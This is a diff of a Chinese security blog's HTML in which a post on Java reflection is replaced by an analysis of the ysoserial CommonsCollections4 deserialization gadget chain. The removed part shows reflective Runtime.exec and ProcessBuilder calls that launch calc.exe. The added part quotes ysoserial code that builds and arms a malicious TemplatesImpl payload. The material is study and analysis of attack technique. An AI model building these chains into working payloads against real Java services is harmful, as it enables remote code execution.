@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>【基础】-JAVA反射 |  QWQ</title>
+      <title>CommonsCollections4反序列化链分析 |  QWQ</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-myjavastudy002"
+  id="post-cc4study"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  【基础】-JAVA反射
+  CommonsCollections4反序列化链分析
 </h1>
  
 
@@ -73,8 +73,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2022/03/04/myjavastudy002/" class="article-date">
-  <time datetime="2022-03-04T03:39:10.000Z" itemprop="datePublished">2022-03-04</time>
+      <a href="/2022/04/03/cc4study/" class="article-date">
+  <time datetime="2022-04-02T16:25:59.000Z" itemprop="datePublished">2022-04-03</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/javaSec/">javaSec</a>
@@ -85,7 +85,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.3k</span>
+            <span class="post-count">615</span>
         </span>
     </span>
 
@@ -94,7 +94,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">5 分钟</span>
+            <span class="post-count">2 分钟</span>
         </span>
     </span>
 </div>
@@ -109,85 +109,54 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="反射的概念"><a href="#反射的概念" class="headerlink" title="反射的概念"></a>反射的概念</h1><p>java反射机制不是很陌生的东西，总结一波反射中重要的概念：</p>
-<ol>
-<li>Java 反射机制允许<strong>运行中的</strong>Java程序获取<strong>自身的信息, 操作类和对象的内部属性.</strong></li>
-</ol>
-<p>&#x3D;&#x3D;&gt;<strong>“ 动态获取信息 “ 和 “ 动态调用属性方法 “</strong></p>
-<p>&#x3D;&#x3D;&gt;对象实例可以通过反射机制获取它的类（类类型）</p>
-<p>&#x3D;&#x3D;&gt;类可以通过反射机制获取它的所有方法和属性</p>
-<p>&#x3D;&#x3D;&gt;获取的属性可以设值，获取的方法可以调用</p>
-<p>反射最重要的用途是开发各种通用框架 . 很多框架都是通过XML文件来进行配置的( 例如 struts.xml , spring-*.xml 等 ) , 即所谓的框架核心配置文件 . 为了确保框架的通用性 , 程序<strong>运行时</strong>需要根据配置文件中对应的内容<strong>加载</strong>不同的类或对象 , 调用不同的方法 , 这也依赖于 Java 反射机制 .</p>
-<p>总的来说，通过反射我们可以：：</p>
-<ol>
-<li><strong>获得一个对象所属的类</strong></li>
-<li><strong>获得任意一个类的成员变量和方法</strong></li>
-<li><strong>构造任意一个类的对象</strong></li>
-<li><strong>任意调用一个对象的方法</strong></li>
-</ol>
-<p>纸上得来终觉浅，还是需要多实践来获得更深的理解</p>
-<p>反射的具体应用，在上一篇里面写的很详细</p>
-<h1 id="通过反射RCE"><a href="#通过反射RCE" class="headerlink" title="通过反射RCE"></a>通过反射RCE</h1><h2 id="java-lang-Runtime"><a href="#java-lang-Runtime" class="headerlink" title="java.lang.Runtime"></a>java.lang.Runtime</h2><p>第一个写的详细一点</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304012210-bbgk8za.png" alt="image-20220304012210-bbgk8za.png"></p>
-<p>java.lang.Runtime 类的 exec() 方法是Java中最常见的执行命令的方式</p>
-<p>我们可以通过forName方法来加载任何类，当然也可以加载Runtime。</p>
-<p>调用exec方法的两个条件：</p>
-<ol>
-<li><p>一个实例对象，可以通过newInstance方法拿到</p>
-</li>
-<li><p>获取到具体的exec方法，反射中要获取一个方法需要知道方法名和参数类型</p>
-</li>
-</ol>
-<h3 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h3><p>1.获取exec方法</p>
-<p>（这里抛出了很多异常，暂时不讨论）</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013024-fncppyt.png" alt="image-20220304013024-fncppyt.png"></p>
-<p>2.获取实例对象然后尝试调用</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013242-v57tfyw.png" alt="image-20220304013242-v57tfyw.png"></p>
-<p>报错了，查看报错信息：</p>
-<p>class com.io.EncodingDemo cannot access a member of class java.lang.Runtime (in module java.base) with modifiers “private”</p>
-<p>跟进到Runtime方法里，发现他的构造方法是private，而newInstance会默认调用无参构造方法，这里牵扯到java的设计模式中的单例设计，比如在学习Servlet的时候遇到的ServletContext。</p>
-<blockquote>
-<p>单例模式有 3 个特点：<br>单例类只有一个实例对象；<br>该单例对象必须由单例类<strong>自行创建；</strong><br>单例类对外提供一个访问该单例的全局访问点。</p>
-<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/1338.html">http://c.biancheng.net/view/1338.html</a></p>
-</blockquote>
-<p>因此不能直接调用newInstance，要通过单例模式设计对象中的获取实例的方法，来获取一个runtime实例</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304013856-gl5a5gu.png" alt="image-20220304013856-gl5a5gu.png"></p>
-<p>由于exec返回的是一个Process对象，我们要通过字节流把结果读出来</p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/44957705">https://zhuanlan.zhihu.com/p/44957705</a></p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304015412-we3v4tx.png" alt="image-20220304015412-we3v4tx.png"></p>
-<h3 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncodingDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(cls);</span><br><span class="line">        execMethod.invoke(runtime,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文分析调试ysoserial中的CC4。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Variation on CommonsCollections2 that uses InstantiateTransformer instead of</span><br><span class="line"> * InvokerTransformer.</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
 
-<p>看Epicccal师傅的博客中得知</p>
-<p>我们可以通过 <strong><code>对象.方法名</code> 来调用实例方法</strong> , <strong><code>类名.方法名</code> 来调用静态方法</strong> , 那么反过来 , <strong><code>方法名.invoke(对象)</code></strong> 可以映射成 <strong><code>方法名.invoke(类)</code></strong></p>
-<p>接着通过p牛的漫谈，思考下面几个问题</p>
-<h3 id="类没有无参构造方法，没有单例模式里的静态方法"><a href="#类没有无参构造方法，没有单例模式里的静态方法" class="headerlink" title="类没有无参构造方法，没有单例模式里的静态方法"></a>类没有无参构造方法，没有单例模式里的静态方法</h3><p>我们可以使用getConstructor方法，获取构造函数信息，它被封装在java.lang.reflect.Constructor中，当然他也需要特定的函数名和参数列表来获取这个唯一的构造函数</p>
-<p>获取到构造函数之后，用newInstance来执行</p>
-<p>例如ProcessBuilder类</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304111005-qs9ld14.png" alt="image-20220304111005-qs9ld14.png"></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>
+<p>和CC2不同的是，CC4使用了<code>InstantiateTransformer</code>代替<code>InvokerTransformer</code></p>
+<p>也就是说和CC3一样，都是用这个类来反射调用方法。所以CC4实际上是CC2+CC3</p>
+<p>本篇也会对之前的内容多一点回顾与复习。</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdk1<span class="number">.7</span>+tomcat8+commons:commons-collections4:<span class="number">4.0</span></span><br></pre></td></tr></table></figure>
 
-<p>这里进行了强制类型转换，也就是直接调用了实例之后的ProcessBuilder，我们也可用反射来调用start</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402232047-t45nbv4.png" alt="image.png"></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="Gadgets-createTemplatesImpl-command"><a href="#Gadgets-createTemplatesImpl-command" class="headerlink" title="Gadgets.createTemplatesImpl(command)"></a>Gadgets.createTemplatesImpl(command)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>
+
+<p>构造并返回了一个包含了恶意字节码的TemplatesImpl对象，组建Templates攻击链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constant</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br></pre></td></tr></table></figure>
+
+<p>新建一个<code>ConstantTransformer</code>对象然后填充一个<code>String.class</code>占位。</p>
+<h2 id="new-InstantiateTransformer"><a href="#new-InstantiateTransformer" class="headerlink" title="new InstantiateTransformer"></a>new InstantiateTransformer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;;</span><br><span class="line">Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">		paramTypes, args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// grab defensively copied arrays</span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402233557-oyg4jqy.png" alt="image.png"></p>
+<p><code>InstantiateTransformer</code>类定义了一个<code>transform</code>方法，这是触发点。</p>
+<p>通过getConstructor来拿到input类的参数类型为<code>this.iParamTypes</code>的构造方法，这里传入的为<code>paramTypes</code>为<code>String.class</code>。</p>
+<p>然后通过newInstance来实例化对象，这里传入的args为一个foo字符占位。</p>
+<p>用<code>Reflections.getFieldValue</code>拿到两个Field，为之后填充真实的payload做准备。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; constant, instantiate &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>将<code>InstantiateTransformer</code>和<code>ConstantTransformer</code>包含到<code>ChainedTransformer</code>里。</p>
+<p>这样当触发<code>ChainedTransformer.transform()</code>的时候，就能够递归调用数组中的transform方法，也能触发最后<code>InstantiateTransformer.transform()</code>，至于传入的对象现在还没填充。</p>
+<h2 id="new-PriorityQueue"><a href="#new-PriorityQueue" class="headerlink" title="new PriorityQueue"></a>new PriorityQueue</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235204-mpqusn8.png" alt="image.png"></p>
+<p>优先队列，这个可以去看cc2讲的很详细。</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235408-3oyqcr9.png" alt="image.png"></p>
+<h2 id="反射赋值"><a href="#反射赋值" class="headerlink" title="反射赋值"></a>反射赋值</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// swap in values to arm</span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>
+
+<p>最后是ysoserial填充的时候，一般这个时候我们才能完全对链子了解。</p>
+<p><code>TrAXFilter.class</code>被设置为<code>ConstantTransformer</code>的<code>iConstant</code>属性的值。</p>
+<p>也就是<code>InstantiateTransformer.transform()</code>传入的input参数</p>
+<p>加上下面的paramTypes和args的填充，基本上那个transform方法我们就能知道最后是咋搞得，主要是下面两句。</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235909-2djllj9.png" alt="image.png"></p>
+<p>跟进到<code>TrAXFilter</code>的构造方法</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403000315-42jmclb.png" alt="image.png"></p>
+<p>这里传入的Templates对象就是我们构造的包含了恶意字节码的对象。</p>
+<p><code>templates.newTransformer()</code>的时候，自动加载了静态块里的恶意代码，完成调用。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总之这条链子就是之前CC2和CC3的结合版，改动的地方不多，可以手写一下Gaget Chain看一下自己懂不懂逻辑hhh</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	PriorityQueue.readObject()</span><br><span class="line">		TransformingComparator.compare()</span><br><span class="line">			ConstantTransformer.transform()</span><br><span class="line">				InstantiateTransformer.transform()</span><br><span class="line">					TemplatesImpl.newTransformer()</span><br><span class="line">					加载静态块恶意代码</span><br></pre></td></tr></table></figure>
 
 
-
-<h3 id="构造方法是私有方法，如何执行"><a href="#构造方法是私有方法，如何执行" class="headerlink" title="构造方法是私有方法，如何执行"></a>构造方法是私有方法，如何执行</h3><p>例子就是上面的Runtime类</p>
-<p>我们使用getDeclaredMethod方法，它能获取的是当前类中“声明”的方法，包括了私有方法，但不包括从父类继承过来的方法</p>
-<p>getMethod方法只能获取公共方法和从父类继承的方法</p>
-<p>我们在获取到一个私有方法后，必须用setAccessible 修改它的作用域，否则仍然不能调用。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; c = clazz.getDeclaredConstructor();</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="java-lang-ProcessBuilder"><a href="#java-lang-ProcessBuilder" class="headerlink" title="java.lang.ProcessBuilder"></a>java.lang.ProcessBuilder</h2><p>上文的Runtime类的exec方法，实质上就是通过ProcessBuilder来执行命令，通过跟进exec方法我们可以发现：</p>
-<p><img src="https://o.130014.xyz/2022/03/04/image-20220304113001-sz96lzx.png" alt="image-20220304113001-sz96lzx.png"></p>
-<p>我们直接通过ProcessBuilder执行命令：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
-
-<p>可以通过cmdarray，传入数组来执行带参数的数据</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Arrays.asList(<span class="string">&quot;ping&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p>王哥，我的超人</p>
-<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1333">https://forum.butian.net/share/1333</a></p>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>断点打在：</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403001436-i6ptn11.png" alt="image.png"></p>
+<p>完整方法栈，可以看到我们的TemplatesImpl对象</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403001723-s3h5ol8.png" alt="image.png"></p>
  
       <!-- reward -->
       
@@ -240,12 +209,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://xianbeil.github.io/2022/03/04/myjavastudy002/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://xianbeil.github.io/2022/04/03/cc4study/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java%E5%9F%BA%E7%A1%80/" rel="tag">java基础</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a></li></ul>
 
     </footer>
   </div>
@@ -253,19 +222,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2022/03/05/myjavastudy003/" class="article-nav-link">
+      <a href="/2022/04/04/cc%E6%80%BB%E7%BB%93/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            【基础】-RMI原理及流程
+            Ysoserial ACC总结
           
         </div>
       </a>
     
     
-      <a href="/2022/03/03/myjavastudy001/" class="article-nav-link">
+      <a href="/2022/03/31/ctfshow%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">【基础】-JAVAWEB基础知识</div>
+        <div class="article-nav-title">ctfshow中期测评</div>
       </a>
     
   </nav>
